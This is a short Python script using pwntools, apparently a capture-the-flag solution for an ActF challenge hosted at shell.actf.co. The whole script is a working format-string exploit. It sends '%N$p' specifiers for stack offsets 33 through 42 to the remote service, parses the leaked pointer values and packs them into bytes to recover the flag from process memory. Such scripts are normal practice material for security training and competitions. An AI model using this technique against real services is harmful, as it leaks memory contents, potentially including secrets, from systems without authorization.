#!/usr/bin/env python3

from pwn import *

flag = b''

for i in range(33, 43):
    nc = remote('shell.actf.co', 21820, level=100)

    nc.sendline(f"%{i}$p")
    nc.recvline()
    flag += p64(int(nc.recvline()[9:].strip().decode(), 16))

print(flag.decode())